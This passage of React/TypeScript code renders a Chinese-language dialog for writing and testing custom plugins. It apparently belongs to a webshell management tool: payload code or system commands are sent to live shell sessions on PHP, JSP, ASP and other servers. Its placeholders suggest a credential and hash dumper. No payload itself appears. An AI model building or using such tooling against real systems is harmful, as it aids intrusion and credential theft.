      onClose();
    } catch (cause) {
      toast.error(`装配保存插件失败：${errorText(cause)}`);
    } finally {
      setBusy(false);
    }
  }

  if (!open) return null;

  function insertMacroIntoCode(paramName: string) {
    const macro = `{{${paramName}}}`;
    setCodeBody((prev) => (!prev.includes(macro) ? prev + `\n$${paramName} = '${macro}';` : prev));
    toast.info(`已插入宏参数 ${macro}`);
  }

  return (
    <Dialog
      title={initialPlugin ? `编辑自定义插件「${initialPlugin.name}」` : "开发自定义插件"}
      size="xlarge"
      onClose={onClose}
      footer={
        <>
          <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
            {lintReport.errors.length === 0 ? (
              <span className="studio-lint-badge ok"><CheckCircle2 size={12} />规范预检通过</span>
            ) : (
              <span className="studio-lint-badge error"><XCircle size={12} />{lintReport.errors.length} 项规范错误</span>
            )}
            {lintReport.warnings.length > 0 && (
              <span className="studio-lint-badge warn"><AlertTriangle size={12} />{lintReport.warnings.length} 项提示</span>
            )}
          </div>
          <div style={{ display: "flex", gap: 10 }}>
            <button
              className={`button ${mode === "test" ? "primary" : "secondary"}`}
              onClick={() => setMode((m) => (m === "edit" ? "test" : "edit"))}
              type="button"
            >
              <Zap size={14} />
              {mode === "edit" ? "验证可用性 / 联调测试" : "返回代码编辑"}
            </button>
            <button className="button secondary" onClick={onClose} disabled={busy} type="button">取消</button>
            <button className="button primary" onClick={() => void handleSave()} disabled={busy} type="button">
              <Save size={14} />
              {busy ? "装配中…" : "保存并装载插件"}
            </button>
          </div>
        </>
      }
    >
      <div className="studio-tab-header">
        <div className="studio-mode-tabs">
          <button type="button" className={`studio-mode-tab ${mode === "edit" ? "active" : ""}`} onClick={() => setMode("edit")}><Code2 size={14} /><span>配置与代码设计</span></button>
          <button type="button" className={`studio-mode-tab ${mode === "test" ? "active" : ""}`} onClick={() => setMode("test")}>
            <Zap size={14} /><span>可用性验证与实机联调</span>
            {lintReport.errors.length > 0 && <span className="studio-pill-count" style={{ background: "var(--danger)" }}>{lintReport.errors.length}</span>}
          </button>
        </div>
      </div>

      <div className="studio-container">
        {mode === "edit" ? (
          <>
            {!initialPlugin && (
              <div className="studio-template-bar">
                <div className="studio-template-title"><Sparkles size={13} color="var(--accent)" /><span>快速套用模版脚手架:</span></div>
                <div className="studio-template-chips">
                  {TEMPLATES.map((tpl) => (
                    <button key={tpl.id} type="button" className="studio-template-chip" onClick={() => loadTemplate(tpl)}><FileCode size={12} /><span>{tpl.name}</span></button>
                  ))}
                </div>
              </div>
            )}
            <div className="studio-meta-card">
              <div className="studio-grid-4">
                <label>
                  <span className="studio-label-text">插件标识 ID <span className="req">*</span></span>
                  <input type="text" value={id} onChange={(e) => setId(e.target.value)} placeholder="e.g. custom_hash_dumper" disabled={Boolean(initialPlugin)} spellCheck={false} />
                </label>
                <label>
                  <span className="studio-label-text">插件显示名称 <span className="req">*</span></span>
                  <input type="text" value={name} onChange={(e) => setName(e.target.value)} placeholder="e.g. 凭据提取与哈希嗅探" />
                </label>
                <label>
                  <span className="studio-label-text">插件分类</span>
                  <select value={category} onChange={(e) => setCategory(e.target.value)}>
                    <option value="general">通用</option>
                    <option value="php">PHP 专项</option>
                    <option value="bypass">Bypass 绕过</option>
                    <option value="proxy">网络代理</option>
                    <option value="crypto">密码学</option>
                    <option value="loader">加载器</option>
                  </select>
                </label>
                <label>
                  <span className="studio-label-text">版本号</span>
                  <input type="text" value={version} onChange={(e) => setVersion(e.target.value)} placeholder="1.0.0" />
                </label>
              </div>
              <div className="studio-grid-2-1">
                <label>
                  <span className="studio-label-text">插件功能与场景描述</span>
                  <input type="text" value={description} onChange={(e) => setDescription(e.target.value)} placeholder="简述功能场景" />
                </label>
                <div>
                  <span className="studio-label-text">支持的运行时语言</span>
                  <div className="studio-lang-chips">
                    {["php", "jsp", "asp", "aspx", "python", "nodejs"].map((lang) => {
                      const isChecked = languages.includes(lang);
                      return (
                        <button type="button" key={lang} className={`studio-lang-chip ${isChecked ? "active" : ""}`} onClick={() => setLanguages((prev) => isChecked ? prev.filter((l) => l !== lang) : [...prev, lang])}>
                          {isChecked && <Check size={11} />}
                          <span>{lang.toUpperCase()}</span>
                        </button>
                      );
                    })}
                  </div>
                </div>
              </div>
            </div>
            <div className="studio-workspace-split">
              <div className="studio-panel">
                <div className="studio-panel-header">
                  <div style={{ display: "flex", alignItems: "center", gap: 6 }}><span className="studio-panel-title">参数规格配置 ({params.length})</span><span className="studio-badge">宏定义</span></div>
                  <button className="button compact secondary" onClick={addParam} type="button"><Plus size={12} />添加参数</button>
                </div>
                <div className="studio-params-table-header">
                  <span>参数键名</span><span>显示标签</span><span>类型</span><span>默认值/选项</span><span style={{ textAlign: "center" }}>删</span>
                </div>
                <div className="studio-params-list">
                  {params.map((p, idx) => (
                    <div key={idx} className="studio-param-row">
                      <input type="text" value={p.name} onChange={(e) => updateParam(idx, { name: e.target.value })} spellCheck={false} />
                      <input type="text" value={p.label} onChange={(e) => updateParam(idx, { label: e.target.value })} />
                      <select value={p.type} onChange={(e) => updateParam(idx, { type: e.target.value })}>
                        <option value="string">string</option><option value="int">int</option><option value="select">select</option><option value="bool">bool</option>
                      </select>
                      <input type="text" value={p.type === "select" ? p.options ?? "" : String(p.default ?? "")} onChange={(e) => p.type === "select" ? updateParam(idx, { options: e.target.value, default: e.target.value.split(",")[0] }) : updateParam(idx, { default: e.target.value })} />
                      <button className="icon-button danger" type="button" onClick={() => removeParam(idx)}><Trash2 size={13} /></button>
                    </div>
                  ))}
                </div>
                {params.length > 0 && (
                  <div className="studio-macro-bar">
                    <span style={{ fontSize: 11, color: "var(--text-faint)" }}>点击插入宏:</span>
                    <div className="studio-macro-tags">
                      {params.filter((p) => p.name.trim()).map((p) => (
                        <button key={p.name} type="button" className="studio-macro-tag" onClick={() => insertMacroIntoCode(p.name.trim())}><code>{`{{${p.name.trim()}}}`}</code></button>
                      ))}
                    </div>
                  </div>
                )}
              </div>
              <div className="studio-panel studio-code-panel">
                <div className="studio-panel-header">
                  <span className="studio-panel-title">执行载荷代码 (Payload)</span>
                  <div className="button-group compact">
                    <button type="button" className={`button compact ${execType === "code" ? "primary" : "secondary"}`} onClick={() => setExecType("code")}><Code2 size={12} />代码载荷</button>
                    <button type="button" className={`button compact ${execType === "command" ? "primary" : "secondary"}`} onClick={() => setExecType("command")}><Terminal size={12} />系统命令</button>
                  </div>
                </div>
                <textarea className="studio-code-editor" value={codeBody} onChange={(e) => setCodeBody(e.target.value)} spellCheck={false} />
              </div>
            </div>
          </>
        ) : (
          <div className="studio-test-layout">
            <div className="studio-test-left">
              <div className="studio-lint-card">
                <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                  <strong style={{ fontSize: 12.5, color: "var(--text)" }}>规范与完整性预检报告</strong>
                  {lintReport.errors.length === 0 ? (
                    <span className="studio-lint-badge ok">✅ 语法与宏匹配合规</span>
                  ) : (
                    <span className="studio-lint-badge error">❌ 发现 {lintReport.errors.length} 项问题</span>
                  )}
                </div>

                {lintReport.errors.length === 0 && lintReport.warnings.length === 0 ? (
                  <p style={{ margin: 0, fontSize: 11.5, color: "var(--text-dim)" }}>
                    插件清单结构完整，全部宏变量与参数表一一对应，代码载荷符合返回规范。
                  </p>
                ) : (
                  <div style={{ display: "flex", flexDirection: "column", gap: 4 }}>
                    {lintReport.errors.map((err, i) => (
                      <div key={i} className="studio-lint-item" style={{ color: "var(--danger)" }}>
                        <XCircle size={13} style={{ flexShrink: 0, marginTop: 2 }} />
                        <span>{err}</span>
                      </div>
                    ))}
                    {lintReport.warnings.map((warn, i) => (
                      <div key={i} className="studio-lint-item" style={{ color: "var(--warn)" }}>
                        <AlertTriangle size={13} style={{ flexShrink: 0, marginTop: 2 }} />
                        <span>{warn}</span>
                      </div>
                    ))}
                  </div>
                )}
              </div>

              <div className="studio-test-form-card">
                <label>
                  <span className="studio-label-text">选择目标测试 Shell 会话</span>
                  <select
                    value={selectedSessionId}
                    onChange={(e) => setSelectedSessionId(e.target.value)}
                  >
                    {sessions.length === 0 ? (
                      <option value="">(当前无活跃连接，将执行本地模拟静态校验)</option>
                    ) : (
                      sessions.map((s) => (
                        <option key={s.sessionId} value={s.sessionId}>
                          {s.server || s.profileId} ({s.sessionId.slice(0, 8)}...)
                        </option>
                      ))
                    )}
                  </select>
                </label>

                {params.length > 0 && (
                  <div>
                    <span className="studio-label-text" style={{ marginBottom: 6, display: "block" }}>
                      测试参数输入
                    </span>
                    <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
                      {params.map((p) => (
                        <label key={p.name} style={{ display: "flex", flexDirection: "column", gap: 4 }}>
                          <span style={{ fontSize: 11, color: "var(--text-dim)" }}>
                            {p.label} (<code>{`{{${p.name}}}`}</code>)
                          </span>
                          {p.type === "select" ? (
                            <select
                              value={testParamValues[p.name] ?? ""}
                              onChange={(e) =>
                                setTestParamValues((prev) => ({ ...prev, [p.name]: e.target.value }))
                              }
                            >
                              {(p.options ? p.options.split(",") : []).map((opt) => (
                                <option key={opt.trim()} value={opt.trim()}>
                                  {opt.trim()}
                                </option>
                              ))}
                            </select>
                          ) : p.type === "bool" ? (
                            <select
                              value={testParamValues[p.name] ?? "false"}
                              onChange={(e) =>
                                setTestParamValues((prev) => ({ ...prev, [p.name]: e.target.value }))
                              }
                            >
                              <option value="true">True (开启)</option>
                              <option value="false">False (关闭)</option>
                            </select>
                          ) : (
                            <input
                              type={p.type === "int" ? "number" : "text"}
                              value={testParamValues[p.name] ?? ""}
                              onChange={(e) =>
                                setTestParamValues((prev) => ({ ...prev, [p.name]: e.target.value }))
                              }
                              placeholder={`输入测试用 ${p.label}`}
                            />
                          )}
                        </label>
                      ))}
                    </div>
                  </div>
                )}

                <button
                  type="button"
                  className="button primary"
                  onClick={() => void runLiveTest()}
                  disabled={testRunning}
                  style={{ marginTop: 6 }}
                >
                  {testRunning ? <RefreshCw size={14} className="spin" /> : <Play size={14} />}
                  {testRunning ? "正在执行测试验证…" : "🚀 立即运行可用性验证"}
                </button>
              </div>
            </div>

            <div className="studio-test-right">
              <div className="studio-test-result-header">
                <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                  <span className="studio-panel-title">验证结果输出 (Console Output)</span>
                  {testResult && (
                    <span className={`studio-lint-badge ${testResult.ok ? "ok" : "error"}`}>
                      {testResult.ok ? "✅ 验证通过" : "❌ 验证未通过"}
                    </span>
                  )}
                </div>

                {testResult?.durationMs !== undefined && (
                  <span style={{ fontSize: 11, color: "var(--text-faint)", fontFamily: "var(--font-mono)" }}>
                    耗时: {testResult.durationMs}ms
                  </span>
                )}
              </div>

              <div className="studio-test-console">
                {testRunning ? (
                  <span style={{ color: "var(--accent)" }}>正在下发载荷并执行测试，请稍候…</span>
                ) : testResult ? (
                  testResult.rawOutput
                ) : (
                  <span style={{ color: "var(--text-faint)" }}>
                    点击左侧「🚀 立即运行可用性验证」按钮开始实机联调发包测试或本地预检。
                  </span>
                )}
              </div>
            </div>
          </div>
        )}
      </div>
    </Dialog>
  );
}
